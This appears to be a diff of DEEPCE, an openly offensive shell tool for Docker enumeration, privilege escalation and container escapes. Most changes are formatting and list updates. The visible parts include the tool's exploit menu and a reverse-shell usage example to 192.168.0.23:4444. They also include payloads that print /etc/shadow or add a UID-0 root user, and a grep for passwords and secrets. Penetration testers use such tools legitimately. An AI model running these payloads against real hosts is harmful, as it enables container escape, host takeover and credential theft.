@@ -34,8 +34,8 @@ $B    ~~~ $DG{$B~~ ~~~~ ~~~ ~~~~ ~~~ ~$DG /  $LG===-$B ~~~$NC
 $DG         \______ X           __/
 $DG           \    \         __/
 $DG            \____\_______/$NC
-          __                        
-     ____/ /__  ___  ____  ________ 
+          __
+     ____/ /__  ___  ____  ________
     / __  / _ \/ _ \/ __ \/ ___/ _ \ $DG  ENUMERATE$NC
    / /_/ /  __/  __/ /_/ / (__/  __/ $DG ESCALATE$NC
    \__,_/\___/\___/ .___/\___/\___/$DG  ESCAPE$NC
@@ -43,7 +43,7 @@ $DG            \____\_______/$NC
 
  Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
  by stealthcopter
-  
+
 EOF
 }
 
@@ -56,41 +56,41 @@ Usage: ${0##*/} [OPTIONS...]
   -nc,--no-colors        Don't use terminal colors
 
   --install              Install useful packages before running script, this will maximise enumeration and exploitation potential
-  
+
   ${DG}[Exploits]$NC
   -e, --exploit          Use one of the following exploits (eg. -e SOCK)
-  
+
     DOCKER         use docker command to create new contains and mount root partition to priv esc
     PRIVILEGED     exploit a container with privileged mode to run commands on the host
     SOCK           use an exposed docker sock to create a new container and mount root partition to priv esc
-    CVE-2019-5746  
-    CVE-2019-5021  
-    
+    CVE-2019-5746
+    CVE-2019-5021
+
   ${DG}[Payloads & Options]$NC
   -i, --ip               The local host IP address for reverse shells to connect to
   -p, --port             The port to use for bind or reverse shells
   -l, --listen           Automatically create the reverse shell listener
-  
+
   -s, --shadow           Print the shadow file as the payload
-  
+
   -cmd, --command        Run a custom command as the payload
-  
+
   -x, --payload          Run a custom executable as the payload
-  
+
   --username             Create a new root user
   --password             Password for new root user
-  
+
   ${DG}[General Options]$NC
   -q, --quiet            Shhhh, be less verbose
   -h, --help             Display this help and exit.
-  
+
   [Examples]
   $DG# Exploit docker to get a local shell as root$NC
   ./deepce.sh -e DOCKER
-  
+
   $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC
-  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444 
-    
+  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444
+
 EOF
 }
 
@@ -98,11 +98,9 @@ EOF
 #--------------) Constants (--------------#
 ###########################################
 
-# Note we use space seperated strings for arrays as sh does not support arrays.
-PATH_APPS="/app /usr/src/app /usr/src/myapp /home/node/app /go/src/app /var/www/html /usr/local/tomcat /mosquitto /opt/sonarqube /var/lib/ghost /var/jenkins_home"
-
-# Common image checks
-# "/etc/traefik/traefik.yml"
+# Note we use space separated strings for arrays as sh does not support arrays.
+PATH_APPS="/app /usr/src/app /usr/src/myapp /home/node/app /go/src/app /var/www/html /usr/local/tomcat /mosquitto /opt/sonarqube /var/lib/ghost /var/jenkins_home /var/lib/rabbitmq /etc/rabbitmq /var/lib/mysql /usr/local/apache2 /etc/nginx /usr/share /usr/local/etc/redis /etc/traefik /var/lib/postgresql /opt/couchbase"
+CONFIG_FILES="/usr/local/apache2/conf/httpd.conf /etc/traefik/traefik.toml /etc/traefik/traefik.yml /etc/mysql/conf.d /etc/mysql/my.cnf /etc/rabbitmq/rabbitmq.config"
 
 GREP_SECRETS="pass\|secret\|key"
 GREP_SOCK_INFOS="Architecture\|OSType\|Name\|DockerRootDir\|NCPU\|OperatingSystem\|KernelVersion\|ServerVersion"
@@ -179,7 +177,7 @@ printStatus() { printer "$DG" "$1"; }
 printYesEx() { printEx Yes; }
 printYes() { printSuccess Yes; }
 printNo() { printFail No; }
-TODO() { printError "TODO"; }
+TODO() { printError "${NC}TODO $1"; }
 nl() { echo ""; }
 
 printTip() {
@@ -261,7 +259,7 @@ installPackages() {
   if [ -x "$(command -v apt)" ]; then
     # Debian based OSes
     printQuestion "Installing Packages ....."
-    
+
     export DEBIAN_FRONTEND=noninteractive
     if ! [ "$(apt update 2>/dev/null)" ]; then #
         printError "Failed"
@@ -273,7 +271,7 @@ installPackages() {
     else
         printError "Failed"
     fi
-    
+
   elif [ -x "$(command -v apk)" ]; then
     # Alpine
     apk add bind-tools curl nmap
@@ -296,6 +294,23 @@ unsetColors(){
   NC=""
   UNDERLINED=""
   EX=""
+}
+
+describeColors(){
+  # Describe the colors unless they have been unset or we're being quiet
+  if [ "$quiet" ] || ! [ "$RED" ]; then
+    return
+  fi
+  printSection "Colors"
+  printQuestion "Exploit Test ............"; printEx "Exploitable - Check this out";
+  printResult "Basic Test .............." "Positive Result"
+  printResult "Another Test ............" "" "Error running check"
+  printQuestion "Negative Test ..........."; printNo;
+  printResultLong "Multi line test ........." "Command output
+spanning multiple lines"
+  nl
+  printTip "Tips will look like this and often contains links with additional info. You can usually ctrl+click links in modern terminal to open in a browser window
+See ${UNDERLINED}https://stealthcopter.github.io/deepce${NC}"
 }
 
 ###########################################
@@ -364,7 +379,7 @@ dockerSockCheck() {
     printFail "Not Found"
     # TODO: Search elsewhere for sock?
   fi
-  
+
   if [ "$dockerSockPath" ]; then
 
     printInfo "$(ls -lah $dockerSockPath)"
@@ -423,7 +438,7 @@ containerID() {
   #containerID="$(uname -n)"
   # Get container full ID
   printResult "Container ID ............" "$containerID" "Unknown"
-  
+
   if [ "$containerType" = "docker" ]; then
     containerFullID=$(basename "$(cat /proc/1/cpuset)")
     printResult "Container Full ID ......." "$containerFullID" "Unknown"
@@ -432,7 +447,7 @@ containerID() {
 
 containerIPs() {
   sleep 2
-  
+
   # Get container IP
   if [ -x "$(command -v hostname)" ]; then
     containerIP="$(hostname -I 2>/dev/null || hostname -i)"
@@ -463,7 +478,7 @@ containerTools(){
   for CMD in ${CONTAINER_CMDS}; do
     tools="$tools $(command -v "${CMD}")"
   done
-  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n')" "None"
+  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n'| grep -v '^$')" "None"
 }
 
 containerName() {
@@ -486,7 +501,7 @@ containerName() {
   else
     containerName=$containerID
   fi
-  
+
   printQuestion "Container Name .........."
   if [ "$containerName" ]; then
     printSuccess "$containerName"
@@ -587,9 +602,9 @@ enumerateContainers() {
   printSection "Enumerating Containers"
 
   if [ "$inContainer" ]; then # If inside a container
-  
+
     printTip "$TIP_NETWORK_ENUM"
-  
+
     # Find containers...
     if [ "$dockerCommand" ]; then
         # Enumerate containers using docker
@@ -602,11 +617,11 @@ enumerateContainers() {
     else
         pingSweep
     fi
-  
+
     portScan
-  
+
   else # Not in a container
-  
+
     if docker ps >/dev/null 2>&1; then # Enumerate docker containers
         dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
         dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
@@ -716,7 +731,6 @@ findMountedFolders() {
   else
     printNo
   fi
-  nl
 }
 
 findInterestingFiles() {
@@ -736,24 +750,21 @@ findInterestingFiles() {
   printStatus "$boringVars"
 
   # Any common entrypoint files etc?
-  printQuestion "Any common entrypoint files ........."
-  nl
-  ls -lah /entrypoint.sh /deploy 2>/dev/null
+  entrypoint=$(ls -lah /entrypoint.sh /deploy 2>/dev/null)
+  printResultLong "Any common entrypoint files ........." "$entrypoint"
 
   # Any files in root dir
-  printQuestion "Interesting files in root ..........."
-  nl
-
   if [ -x "$(command -v find)" ]; then
-    find / -maxdepth 1 -type f | grep -v "/.dockerenv\|deepce.sh"
+    interestingFiles=$(find / -maxdepth 1 -type f | grep -v "/.dockerenv\|deepce.sh")
   else
     # shellcheck disable=SC2010
-    ls -lah / | grep -v '^d\|^l\|^total\|.dockerenv\|deepce.sh'
+    interestingFiles=$(ls -lah / | grep -v '^d\|^l\|^total\|.dockerenv\|deepce.sh')
   fi
-  nl
 
-  # Any passwords root dir files
-  result=$(grep -Iins "$GREP_SECRETS" /*)
+  printResultLong "Interesting files in root ..........." "$interestingFiles"
+
+  # Any secrets in root dir files
+  result=$(grep -Iins --exclude="deepce.sh" "$GREP_SECRETS" /*)
 
   printResultLong "Passwords in common files ..........." "$result"
 
@@ -820,7 +831,7 @@ checkDockerVersionExploits() {
   if ! [ "$dockerVersion" ]; then
     return
   fi
-  
+
   printQuestion "CVE–2019–13139 .........."
   if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
     printYesEx
@@ -853,13 +864,13 @@ prepareExploit() {
   printMsg "Preparing Exploit" " "
 
   if [ "$shadow" ]; then
-  
+
     # Show shadow password hashes
     printMsg "Exploit Type ............." "Print Shadow"
     printMsg "Clean up ................." "Automatic on container exit"
-    
+
     cmd="cat /etc/shadow"
-    
+
   elif [ "$username" ]; then
     # New root user
 
@@ -879,15 +890,15 @@ prepareExploit() {
     printMsg "Clean up ................." "Automatic on container exit"
     # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
     cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"
-    
+
   elif [ "$command" ]; then
-    
+
     # Custom payload (run a command)
     printMsg "Exploit Type ............." "Custom Command"
     printMsg "Custom Command ..........." "$command"
     printMsg "Clean up ................." "Automatic on container exit"
     cmd="$command"
-    
+
   elif [ "$ip" ]; then
     # Reverse shell
 
@@ -1147,6 +1158,7 @@ done
 ###########################################
 
 banner
+describeColors
 installPackages
 
 if ! [ "$skipEnum" ]; then
@@ -1205,42 +1217,3 @@ fi
 printSection ""
 
 exit 0
-
-###########################################
-#--------------) POSTAMBLE (--------------#
-###########################################
-
-# ENUM
-#
-# TODO Enumerate other docker containers (inter-container communication)
-# TODO: What can we get from /proc/ # cat /proc/self/cgroup
-# TODO: Node apps
-# TODO: Python apps
-# TODO: Common docker control apps (kubes, portainer)
-#
-# PAYLOADS
-#
-# -x, --payload        The payload file to execute instead of creating a listener
-# -s, --shadow         Exploit payload to print the contents of the shadow file
-# -ru, --root-user     Add a new root user to /etc/passwd and /etc/shadow
-#
-# SSH Key
-#
-# PAYLOADS
-# - drop suid shell
-#
-# EXPLOITS
-#
-# TODO: Automatic - enum and try whatever seems best
-#
-# TODO: CVE-2019-5746 (runc)
-# TODO: CVE-2019-5021 (Alpine Linux Docker Image Credential Vulnerability)
-# TODO: Container escapes
-# TODO: Exploit docker over http
-# Windows only docker exploits
-# CVE–2019–15752
-# CVE–2018–15514
-
-# Docker sock api https://docs.docker.com/engine/api/v1.24/
-
-# Recommend static binaries https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
